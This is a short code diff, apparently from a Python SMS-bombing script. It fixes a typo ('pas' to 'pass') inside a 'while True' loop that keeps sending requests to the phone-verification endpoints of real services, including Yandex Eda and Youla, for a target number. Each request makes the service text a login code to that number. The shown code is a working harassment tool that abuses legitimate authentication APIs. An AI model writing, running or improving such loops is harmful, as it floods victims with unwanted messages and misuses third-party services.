@@ -61,7 +61,7 @@ while True:
 		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
 		print('xyandex.Eda')
 	except:
-		pas
+		pass
 
 	try:
 		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
